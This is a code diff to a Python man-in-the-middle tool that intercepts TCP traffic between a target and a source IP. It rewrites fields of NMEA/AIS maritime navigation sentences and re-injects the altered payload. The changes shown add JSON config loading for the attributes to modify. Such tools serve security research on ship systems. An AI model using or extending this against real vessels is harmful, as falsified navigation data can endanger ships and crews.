@@ -5,7 +5,8 @@ import os
 import argparse
 from pyais import *
 from NMEA import NMEA
-        
+import json
+
 class MITM:
     def __init__(self, target_ip,  src_ip, config_data):
         self.target_ip = target_ip
@@ -45,7 +46,8 @@ class MITM:
     
                         else:
                             nmea_obj.modify_attr(attribute['key'], attribute['value'])
-
+                    
+                    #print(nmea_obj.sentence)
                     pktIP[TCP].add_payload(nmea_obj.sentence)
                     print(f"\n[*] Payload modified and sending...\n{nmea_obj.sentence}\n")
                     
@@ -86,11 +88,13 @@ def get_input():
     args = parser.parse_args()
     return args
 
+def read_config(config_file):
+    return json.load(open(config_file,'r'))
 
 if __name__ == '__main__':
     args = get_input()
 
-    mitm = MITM(args.target_ip, args.source_ip)
+    mitm = MITM(args.target_ip, args.source_ip, read_config(args.config))
     mitm.setup()
     
     try:
